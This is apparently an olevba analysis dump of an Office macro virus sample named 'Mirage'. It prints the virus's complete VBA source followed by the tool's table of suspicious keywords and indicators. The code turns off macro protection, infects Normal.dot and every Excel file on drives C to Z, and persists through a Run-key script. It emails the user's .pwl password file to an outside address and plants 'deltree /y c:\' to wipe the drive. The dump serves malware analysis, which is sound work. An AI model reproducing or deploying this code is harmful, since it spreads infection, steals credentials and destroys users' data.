olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.NoStyle.d-b46bff3d48fc1342df3bf10d21207cc4cf7d29ba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.NoStyle.d-b46bff3d48fc1342df3bf10d21207cc4cf7d29ba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Q4nG2sA6tR0jU6i
Private Sub Document_Open(): On Error Resume Next
mirage:
L = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 1)
XXX = Mid(L, 2)
If ActiveDocument.ProtectionType <> wdNoProtection Then ActiveDocument.Unprotect XXX
Application.ScreenUpdating = 0
DOT = False
DOC = False
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "mirage:" Then DOT = True
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "mirage:" Then DOC = True
If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Then GoTo jkm Else GoTo tyda
jkm: rta = GetAttr(NormalTemplate.FullName)
If rta = 33 Then rta = 1
If rta = 1 Then GoTo lxx Else GoTo tyda
lxx: NormalTemplate.OpenAsDocument
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Close
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "Windows 95" And DOT = False Then Call PSW_: Call Trojan: End
ActiveDocument.VBProject.VBComponents.Item(1).Export (Environ("WINDIR") & "\SYSTEM\mirage.sys")
Open Environ("WINDIR") & "\SYSTEM\mirage.vbs" For Output As #1
Print #1, "On Error Resume Next"
Print #1, "Set mirage = WScript.CreateObject(""Word.Application"")"
Print #1, "mirage.Options.VirusProtection = 0"
Print #1, "mirage.Options.SaveNormalPrompt = 0"
Print #1, "For x = 1 To mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile """ & Environ("WINDIR") & "\SYSTEM\mirage.sys"""
Print #1, "mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4"
Print #1, "mirage.NormalTemplate.Save"
Print #1, "mirage.Application.Quit"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "WSHShell.RegDelete ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MIRAGE"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeBackColors"",""1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeForeColors"",""1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6"","""""
Print #1, "WSHShell.RegWrite ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel\Options6"","""""
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MIRAGE") = Environ("WINDIR") & "\SYSTEM\mirage.vbs"
GoTo 1
End
tyda:
Document_New
If ActiveDocument.ReadOnly = True Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
If DOT = True And DOC = True Then GoTo 1
If DOT = False Then
VV = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString VV
End With
End If
If DOC = False Then
CC = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString CC
End With
End If
If ActiveDocument.FullName = wdOpenFormatDocument Then
ActiveDocument.SaveAs ActiveDocument.FullName
End If
1: ActiveDocument.Saved = True
PSW_
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Document_New
Set BN = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
Set mirage = GetObject(, "Word.Application")
If mirage = "" Then
Set mirage = CreateObject("Word.Application")
Wordz = True
End If
Set GH = mirage.NormalTemplate.VBProject.VBComponents(1).CodeModule
If GH.Lines(3, 1) <> "mirage:" Then
mirage.Options.VirusProtection = 0
mirage.Options.SaveNormalPrompt = 0
GH.DeleteLines 1, GH.CountOfLines
GH.InsertLines 1, BN.Lines(1, BN.CountOfLines)
Set GH = Nothing
End If
If Wordz = True Then mirage.Quit
PSW_
End Sub
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = 0
Document_New
If ActiveDocument.Name = ActiveDocument.FullName Then End
f = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 1)
YYY = Mid(f, 2)
If ActiveDocument.Saved = True Then GoTo 1 Else GoTo 2
1: If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "mirage:" Then ' GoTo 2
NN = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString NN
End With
For P = 1 To 5
L = Int(Rnd() * (90 - 66) + 65): z = Int(Rnd() * (57 - 49) + 48): S = Int(Rnd() * (122 - 98) + 97)
GenPas = GenPas + Chr$(L) + Chr$(z) + Chr$(S)
Next
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline 1, "'" & GenPas
End If
ActiveDocument.Protect 2, 0, YYY: Application.DisplayAlerts = 0
ActiveDocument.Save
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 1, "'" & GenPas: End
2: ActiveDocument.Protect 2, 0, YYY: Application.DisplayAlerts = 0
End Sub
Private Sub PSW_()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "MIRAGE") = "MIRAGE" Then End
Set oa = CreateObject("Outlook.Application")
Set mn = oa.GetNameSpace("MAPI")
Set PSW = oa.CreateItem(0)
If oa = "Outlook" Then
mn.Logon "profile", "password"
PSW.BCC = "btr7@mail.ru"
PSW.Subject = "Fwd: " & Application.UserName
PSW.Body = "Fresh thieved"
PSW.Attachments.Add Environ("WINDIR") & "\" & Application.UserName & ".pwl"
PSW.Send
mn.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "MIRAGE") = "MIRAGE"
End Sub
Private Sub Trojan()
On Error Resume Next
Open Environ("WINDIR") & "\" & "virus.scr" For Output As #1
Print #1, "N VIRUS.BMP"
Print #1, "E 0100 42 4D 76 02 00 00 00 00 00 00 76 00 00 00 28 00"
Print #1, "E 0110 00 00 20 00 00 00 20 00 00 00 01 00 04 00 00 00"
Print #1, "E 0120 00 00 00 02 00 00 C4 0E 00 00 C4 0E 00 00 00 00"
Print #1, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 80"
Print #1, "E 0140 00 00 00 80 80 00 80 00 00 00 80 00 80 00 80 80"
Print #1, "E 0150 00 00 C0 C0 C0 00 80 80 80 00 00 00 FF 00 00 FF"
Print #1, "E 0160 00 00 00 FF FF 00 FF 00 00 00 FF 00 FF 00 FF FF"
Print #1, "E 0170 00 00 FF FF FF 00 99 99 99 99 99 99 99 99 99 99"
Print #1, "E 0180 99 99 99 99 99 99 99 99 00 09 90 09 00 90 09 90"
Print #1, "E 0190 00 99 00 00 09 99 99 99 00 09 90 09 00 90 09 00"
Print #1, "E 01A0 00 09 99 90 09 99 99 90 09 00 90 09 00 00 99 00"
Print #1, "E 01B0 90 09 00 00 09 99 99 90 09 00 90 09 00 90 09 00"
Print #1, "E 01C0 90 09 00 99 99 99 99 90 09 00 90 09 00 00 99 00"
Print #1, "E 01D0 90 09 00 00 09 99 99 99 99 99 99 99 99 99 99 99"
Print #1, "E 01E0 99 99 99 99 99 99 99 99 99 99 90 00 00 00 00 00"
Print #1, "E 01F0 00 99 99 99 99 99 99 99 99 90 00 BB BB BB BB BB"
Print #1, "E 0200 B0 00 99 99 99 99 99 99 99 00 BB BB BB 00 0B BB"
Print #1, "E 0210 BB B0 00 99 99 99 99 99 99 0B BB BB BB BB BB BB"
Print #1, "E 0220 BB BB B0 09 99 99 99 99 00 BB BB BB BB BB BB BB"
Print #1, "E 0230 BB BB BB 00 99 99 99 99 0B BB BB B0 00 00 00 00"
Print #1, "E 0240 BB BB BB B0 99 99 99 99 0B BB B0 00 F0 F0 F0 F0"
Print #1, "E 0250 00 BB BB B0 99 99 99 90 0B 0B 00 00 00 00 00 00"
Print #1, "E 0260 00 0B 0B B0 99 99 99 90 0B B0 B0 00 F0 F0 F0 F0"
Print #1, "E 0270 00 B0 BB B0 99 99 99 90 BB BB 0B B0 00 00 00 00"
Print #1, "E 0280 BB 0B BB B0 99 99 99 90 BB BB BB BB BB BB BB BB"
Print #1, "E 0290 BB BB BB B0 99 99 99 90 BB BB BB BB BB BB BB BB"
Print #1, "E 02A0 BB BB BB 00 99 99 99 99 0B B0 00 00 BB BB BB 00"
Print #1, "E 02B0 00 0B BB 09 99 99 99 99 0B B0 FF F0 0B BB B0 0F"
Print #1, "E 02C0 FF 0B BB 09 99 99 99 99 0B B0 FF FF 00 BB 00 FF"
Print #1, "E 02D0 FF 0B B0 09 99 99 99 99 00 B0 FF F0 0B BB B0 0F"
Print #1, "E 02E0 FF 0B B0 99 99 99 99 99 90 00 00 00 BB BB BB 00"
Print #1, "E 02F0 00 0B B0 99 99 99 99 99 99 0B BB BB BB BB BB BB"
Print #1, "E 0300 BB BB B0 99 99 99 99 99 99 0B BB BB BB BB BB BB"
Print #1, "E 0310 BB BB B0 99 99 99 99 99 99 0B BB BB BB BB BB BB"
Print #1, "E 0320 BB BB B0 99 99 99 99 99 99 00 BB BB BB BB BB BB"
Print #1, "E 0330 BB BB B0 99 99 99 99 99 99 90 00 00 00 0B BB BB"
Print #1, "E 0340 BB BB 09 99 99 99 99 99 99 99 99 99 00 0B BB BB"
Print #1, "E 0350 BB B0 99 99 99 99 99 99 99 99 99 99 99 00 00 00"
Print #1, "E 0360 00 09 99 99 99 99 99 99 99 99 99 99 99 99 99 99"
Print #1, "E 0370 99 99 99 99 99 99"
Print #1, "RCX"
Print #1, "276"
Print #1, "W"
Print #1, "Q"
Close #1
ChDir Environ("WINDIR") & "\"
Open Environ("WINDIR") & "\" & "virus.bat" For Output As #1
Print #1, "@echo off"
Print #1, "debug < virus.scr"
Close #1
Shell Environ("WINDIR") & "\" & "virus.bat", 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper") = Environ("WINDIR") & "\" & "virus.bmp"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "WallpaperStyle") = "2"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "Virus MIRAGE !!!"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "Adieus!!!"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MIGAGE") = "deltree /y c:\"
System.PrivateProfileString("C:\Autorun.inf", "Autorun", "Open") = "Deltree /Y C:\"
SetAttr "C:\Autorun.inf", 2 + 4
Dim a, b, c
a = 5
b = Timer
Do While Timer < b + a
DoEvents
Loop
c = Timer
Kill Environ("WINDIR") & "\" & "virus.scr"
Kill Environ("WINDIR") & "\" & "virus.bat"
Tasks.ExitWindows
End Sub
Private Sub Document_New()
On Error Resume Next
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
Application.DisplayAlerts = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0
ActiveDocument.ReadOnlyRecommended = 0
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then: CommandBars("Macro").Controls("Security...").Enabled = 0: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AVPCC") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices", "AVPCC Service") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
If Day(Now()) = 12 And WeekDay(Now()) = 5 Then: Call Trojan: End
On Error GoTo qw
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "mirage:" Then
If NormalTemplate.VBProject.VBComponents("mirage").Name = "mirage" Then Exit Sub
qw: rn = Int(Rnd() * 95891 + 1)
Open Environ("WINDIR") & "\SYSTEM\" & rn & ".sys" For Output As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "mirage" & Chr(34)
Print #1, "Sub ViewVBcode()"
Print #1, "End Sub"
Print #1, "Sub AutoExec()"
Print #1, "Options.VirusProtection = 0"
Print #1, "V = Second(Now())"
Print #1, "Application.OnTime Now + TimeValue(""00:"" & (V) & "":00""), ""InfXls"""
Print #1, "End Sub"
Print #1, "Sub ToolsOptions()"
Print #1, "Options.VirusProtection = 1"
Print #1, "If Dialogs(wdDialogToolsOptions).Show Then"
Print #1, "End If"
Print #1, "Options.VirusProtection = 0"
Print #1, "End Sub"
Print #1, "Sub ToolsMacro()"
Print #1, "End Sub"
Print #1, "Sub Organizer()"
Print #1, "End Sub"
Print #1, "Sub AutoExit()"
Print #1, "Application.ScreenUpdating = 0"
Print #1, "Options.VirusProtection = 1"
Print #1, "End Sub"
Print #1, "Sub InfXls()"
Print #1, "On Error Resume Next"
Print #1, "Set fs = Application.FileSearch"
Print #1, "fs.LookIn = ""C:\ ; D:\ ; E:\ ; F:\ ; G:\ ; H:\ ; I:\ ; J:\ ; K:\ ; L:\ ; M:\ ; N:\ ; O:\ ; P:\ ; Q:\ ; R:\ ; S:\ ; T:\ ; U:\ ; V:\ ; W:\ ; X:\ ; Y:\ ; Z:\"
Print #1, "fs.SearchSubFolders = True"
Print #1, "fs.FileName = ""*.xls"""
Print #1, "fs.Execute"
Print #1, "For z = 1 To fs.FoundFiles.Count"
Print #1, "SetAttr fs.FoundFiles(z), 0"
Print #1, "DD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)"
Print #1, "Set XLS = CreateObject(""Excel.Application"")"
Print #1, "Set qwert = XLS.Workbooks.Open(fs.FoundFiles(z))"
Print #1, "If qwert.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> ""mirage:"" Then"
Print #1, "With qwert.VBProject.VBComponents.Item(1).CodeModule"
Print #1, ".DeleteLines 1, .CountOfLines: .AddFromString DD"
Print #1, "End With"
Print #1, "qwert.Save"
Print #1, "End If"
Print #1, "qwert.Close"
Print #1, "Next z"
Print #1, "XLS.Quit"
Print #1, "End Sub"
Print #1, "Sub FilePrint()"
Print #1, "On Error Resume Next"
Print #1, "If Dialogs(wdDialogFilePrint).Show = -1 Then"
Print #1, "Call InfXls"
Print #1, "End If"
Print #1, "End Sub"
Close #1
NormalTemplate.VBProject.VBComponents.import (Environ("WINDIR") & "\SYSTEM\" & rn & ".sys")
Kill Environ("WINDIR") & "\SYSTEM\" & rn & ".sys"
NormalTemplate.Save
End If
End Sub
'
'               MMM            MMMMMMMMM                 MM
'             MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
'              MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
'               MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
'               MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'               MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'               MMM        MMMMMMMMMMMMM           MMMMMMMMMM
'               MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM
'                MM         MMMMMMMM               M  MMMMMMM
'                MM        MMMMMMMMM             MMM   MMMMMM
'                         MMMMMMMMMMMMMM      MMMMM    MMMMMM
'                MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
'               MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
'              MMMMMMMMMM                                MM
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirage.vbs          |Executable file name                         |
|IOC       |virus.scr           |Executable file name                         |
|IOC       |virus.bat           |Executable file name                         |
|IOC       |Autorun.inf         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

